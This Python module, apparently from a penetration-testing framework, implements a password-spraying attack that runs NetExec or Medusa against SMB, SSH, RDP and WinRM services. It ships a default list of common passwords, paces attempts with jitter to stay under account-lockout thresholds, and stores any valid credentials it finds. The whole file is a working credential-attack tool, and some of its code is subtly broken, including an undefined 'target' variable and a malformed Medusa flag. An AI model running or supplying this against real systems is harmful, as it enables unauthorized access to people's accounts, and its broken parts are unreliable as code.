"""
Password Spraying Module

Implements password spraying techniques using multiple tools for reliability:
- NetExec (nxc) as primary tool
- Medusa as fallback
- Automatic delay calculation based on policy with safety padding
- Smart lockout detection and prevention
- Persistent attempt tracking to prevent lockouts across sessions
"""

from typing import Dict, List, Optional, Callable, Union, Tuple
from .base_valid_users import BaseValidUsersAttack
from .password_policy import PasswordPolicy
import time
import re
import random
from pathlib import Path
import tempfile

class PasswordSpray(BaseValidUsersAttack):
    """Implementation of password spraying attacks"""
    
    def __init__(self):
        super().__init__()
        self.policy_tracker = PasswordPolicy()
        self.consecutive_lockouts = 0
        self.max_consecutive_lockouts = 5
        self.default_threshold = 3  # Default number of attempts before lockout
        self.default_window = 30  # Default window in minutes
    
    @property
    def required_tools(self) -> Dict[str, str]:
        return {
            'nxc': 'netexec',  # Primary tool
            'medusa': 'medusa'  # Fallback tool
        }
    
    def _calculate_delay(self, policy: Dict) -> Tuple[int, int]:
        """
        Calculate safe delay between attempts with 10% padding
        
        Args:
            policy: Password policy dict
            
        Returns:
            Tuple[int, int]: (delay in seconds, jitter in seconds)
        """
        # Get lockout window in minutes
        window = policy.get('lockout_reset', self.default_window)
        threshold = policy.get('lockout_threshold', self.default_threshold)
        
        if threshold == 0:  # No lockout
            return 1, 1  # Minimal delay
        
        # Calculate safe delay:
        # window_minutes * 60 / threshold = seconds between attempts
        # Add 10% padding
        base_delay = (window * 60) / threshold
        delay = int(base_delay * 1.1)  # 10% padding
        
        # Add jitter of up to 20% of delay
        jitter = int(delay * 0.2)
        
        return delay, jitter
    
    def _get_user_delay_preference(self, callback: Optional[Callable] = None) -> Tuple[int, int]:
        """Get delay preference from user when no policy is found"""
        if not callback:
            # If no callback, use conservative defaults
            return 30, 5
            
        callback('input_needed', {
            'message': '''No password policy found. To prevent account lockouts, please specify:
1. How many failed attempts are allowed before lockout? (default: 3)
2. How long is the lockout window in minutes? (default: 30)
3. Or specify a fixed delay between attempts in seconds (overrides 1 & 2)

Note: These settings will be saved and used for future attempts against this target.''',
            'required': True
        })
        
        # Wait for user response
        while True:
            if hasattr(callback, 'get_response'):
                response = callback.get_response()
                if response:
                    try:
                        # Check if user provided a fixed delay
                        if response.isdigit():
                            delay = int(response)
                            return delay, int(delay * 0.2)  # 20% jitter
                            
                        # Parse threshold,window format
                        threshold, window = map(int, response.split(','))
                        if threshold > 0 and window > 0:
                            # Save as policy for future use
                            self.policy_tracker._save_policy(target, {
                                'lockout_threshold': threshold,
                                'lockout_reset': window,
                                'source': 'user_provided'
                            })
                            # Calculate delay
                            base_delay = (window * 60) / threshold
                            delay = int(base_delay * 1.1)
                            return delay, int(delay * 0.2)
                            
                    except:
                        pass
                        
                    callback('input_needed', {
                        'message': 'Invalid input. Please specify either:\n- A fixed delay in seconds (e.g. "30")\n- Threshold and window as "threshold,window" (e.g. "3,30")',
                        'required': True
                    })
            time.sleep(1)
    
    def _run_attack(self, target: str, options: Optional[Dict] = None,
                    callback: Optional[Callable] = None) -> bool:
        """
        Run password spraying attack
        
        Args:
            target: Target to attack
            options: Optional configuration:
                - userlist: List of usernames or path to file
                - passwords: List of passwords or path to file (default: built-in list)
                - delay: Delay between attempts in seconds (default: auto)
                - jitter: Random jitter range in seconds (default: auto)
                - protocol: Protocol to spray (default: 'smb')
                - tool: Tool to use ('nxc' or 'medusa', default: 'nxc')
                - safe_mode: Whether to enforce lockout prevention (default: True)
            callback: Optional callback for progress updates
            
        Returns:
            bool: True if any credentials were found
        """
        try:
            options = options or {}
            protocol = options.get('protocol', 'smb')
            tool = options.get('tool', 'nxc')
            safe_mode = options.get('safe_mode', True)
            
            # Get or create userlist file
            userlist_file = self._prepare_userlist(options.get('userlist', []))
            if not userlist_file:
                self.logger.error("No users provided for spray")
                return False
            
            # Get list of users
            with open(userlist_file, 'r') as f:
                usernames = f.read().splitlines()
            
            # Reset lockout counter
            self.consecutive_lockouts = 0
            
            if safe_mode:
                # Get password policy first
                if callback:
                    callback('progress', {'message': 'Checking password policy...'})
                
                self.policy_tracker._run_attack(target)
                policy = self.policy_tracker.get_policy(target)
                
                if policy:
                    if callback:
                        callback('progress', {
                            'message': 'Found password policy',
                            'policy': policy
                        })
                    
                    # Calculate safe delays
                    delay, jitter = self._calculate_delay(policy)
                else:
                    # Get delay preference from user
                    delay, jitter = self._get_user_delay_preference(callback)
                    if callback:
                        callback('progress', {
                            'message': f'Using delay of {delay}s (±{jitter}s jitter) between attempts'
                        })
                
                # Filter out users with too many recent attempts
                safe_users = [
                    user for user in usernames
                    if self.policy_tracker.is_safe_to_spray(target, user)
                ]
                
                if len(safe_users) < len(usernames):
                    skipped = len(usernames) - len(safe_users)
                    if callback:
                        callback('progress', {
                            'message': f'Skipping {skipped} users due to recent attempts'
                        })
                    
                    if not safe_users:  # No users safe to spray
                        if callback:
                            callback('error', {
                                'message': 'No users safe to spray at this time. Try again later.'
                            })
                        return False
                    
                    # Update userlist file with safe users
                    with open(userlist_file, 'w') as f:
                        f.write('\n'.join(safe_users))
                    
                    # Update our list of users
                    usernames = safe_users
            else:
                delay = options.get('delay', 0)
                jitter = options.get('jitter', 0)
            
            # Get password list
            passwords = self._get_password_list(options.get('passwords', []))
            
            # Track if we found anything
            found_creds = False
            
            if callback:
                callback('progress', {
                    'message': f'Starting password spray against {protocol.upper()} service',
                    'total_attempts': len(passwords) * len(usernames),
                    'delay': delay,
                    'jitter': jitter
                })
            
            # Try each password
            for password in passwords:
                if callback:
                    callback('progress', {
                        'message': f'Trying password pattern: {password}',
                        'current_password': password,
                        'users_remaining': len(usernames),
                        'consecutive_lockouts': self.consecutive_lockouts
                    })
                
                # Record attempts BEFORE trying
                for username in usernames:
                    self.policy_tracker.add_attempt(
                        target, username, f'password_spray_{tool}',
                        success=False
                    )
                
                # Run the spray with current password
                if tool == 'nxc':
                    success, lockouts = self._spray_nxc(target, userlist_file, password, protocol)
                else:
                    success, lockouts = self._spray_medusa(target, userlist_file, password, protocol)
                
                if success:
                    found_creds = True
                
                # Update lockout counter
                if lockouts > 0:
                    self.consecutive_lockouts += 1
                    if callback:
                        callback('warning', {
                            'message': f'Detected {lockouts} locked accounts',
                            'consecutive_lockouts': self.consecutive_lockouts
                        })
                else:
                    self.consecutive_lockouts = 0
                
                # Stop if too many consecutive lockouts
                if self.consecutive_lockouts >= self.max_consecutive_lockouts:
                    if callback:
                        callback('error', {
                            'message': f'Stopping spray after {self.consecutive_lockouts} consecutive lockouts'
                        })
                    break
                
                # Add delay between attempts
                if delay > 0:
                    actual_delay = delay + (random.random() * jitter)
                    if callback:
                        callback('progress', {
                            'message': f'Waiting {int(actual_delay)}s before next attempt'
                        })
                    time.sleep(actual_delay)
            
            return found_creds
            
        except Exception as e:
            self.logger.error(f"Password spray error: {str(e)}")
            return False
        finally:
            # Cleanup temp files
            if 'userlist_file' in locals() and userlist_file:
                Path(userlist_file).unlink(missing_ok=True)
    
    def _prepare_userlist(self, userlist: Union[List[str], str, Path]) -> Optional[str]:
        """Prepare userlist file for spraying"""
        try:
            # If string, assume it's a file path
            if isinstance(userlist, (str, Path)):
                return str(userlist)
            
            # If list, create temp file
            if isinstance(userlist, list) and userlist:
                fd, path = tempfile.mkstemp(suffix='.txt')
                with open(fd, 'w') as f:
                    f.write('\n'.join(userlist))
                return path
            
            return None
            
        except Exception as e:
            self.logger.error(f"Error preparing userlist: {str(e)}")
            return None
    
    def _get_password_list(self, passwords: Optional[List[str]] = None) -> List[str]:
        """Get list of passwords to try"""
        # Start with empty/common patterns
        default_list = [
            '',  # Blank password
            'password',
            'Password123!',
            'Welcome123!',
            'Summer2024!',
            'Winter2024!',
            'Spring2024!',
            'Fall2024!',
            'Company123!',
            'Password1',
            'password1',
            'Password2024!',
            'ChangeMe123!'
        ]
        
        if passwords:
            if isinstance(passwords, (str, Path)):
                # Read from file
                with open(passwords, 'r') as f:
                    return f.read().splitlines()
            return passwords
            
        return default_list
    
    def _spray_nxc(self, target: str, userlist: str, password: str,
                   protocol: str = 'smb') -> Tuple[bool, int]:
        """
        Spray using NetExec
        
        Args:
            target: Target host/IP
            userlist: Path to userlist file
            password: Password to spray
            protocol: Protocol to spray
            
        Returns:
            Tuple[bool, int]: (success, number of lockouts)
        """
        try:
            cmd = [
                'nxc', protocol,
                target,
                '-u', userlist,
                '-p', password,
                '--no-bruteforce',  # One password against all users
                '--continue-on-success'  # Don't stop at first valid cred
            ]
            
            result = self.run_cmd(cmd, silent=True)
            
            # Parse results
            found_creds = False
            lockouts = 0
            
            for line in result.stdout.splitlines():
                if '[+]' in line and 'credential' in line.lower():
                    found_creds = True
                    # Extract username from line
                    if match := re.search(r'(\S+):(\S+)', line):
                        username = match.group(1)
                        self.add_credential({
                            'username': username,
                            'password': password,
                            'type': 'plaintext',
                            'protocol': protocol,
                            'source': 'password_spray'
                        })
                elif 'STATUS_ACCOUNT_LOCKED_OUT' in line:
                    lockouts += 1
            
            return found_creds, lockouts
            
        except Exception as e:
            self.logger.error(f"NetExec spray error: {str(e)}")
            return False, 0
    
    def _spray_medusa(self, target: str, userlist: str, password: str,
                      protocol: str = 'smb') -> Tuple[bool, int]:
        """
        Spray using Medusa
        
        Args:
            target: Target host/IP
            userlist: Path to userlist file
            password: Password to spray
            protocol: Protocol to spray
            
        Returns:
            Tuple[bool, int]: (success, number of lockouts)
        """
        try:
            # Map protocol to Medusa module
            module_map = {
                'smb': 'smbnt',
                'ssh': 'ssh',
                'rdp': 'rdp',
                'winrm': 'http'
            }
            
            module = module_map.get(protocol)
            if not module:
                self.logger.error(f"Unsupported protocol for Medusa: {protocol}")
                return False, 0
            
            cmd = [
                'medusa',
                '-h', target,
                '-U', userlist,
                '-p', password,
                '-M', module,
                '-t', '1',  # Single thread
                '-n', '445' if protocol == 'smb' else None,
                '-F'  # Stop on first valid
            ]
            
            # Remove None values
            cmd = [x for x in cmd if x is not None]
            
            result = self.run_cmd(cmd, silent=True)
            
            # Parse results
            found_creds = False
            lockouts = 0
            
            for line in result.stdout.splitlines():
                if 'SUCCESS' in line:
                    found_creds = True
                    # Extract username from line
                    if match := re.search(r'host: \S+ .*user: (\S+)\s+pass:', line):
                        username = match.group(1)
                        self.add_credential({
                            'username': username,
                            'password': password,
                            'type': 'plaintext',
                            'protocol': protocol,
                            'source': 'password_spray'
                        })
                elif 'ACCOUNT_LOCKED' in line:
                    lockouts += 1
            
            return found_creds, lockouts
            
        except Exception as e:
            self.logger.error(f"Medusa spray error: {str(e)}")
            return False, 0 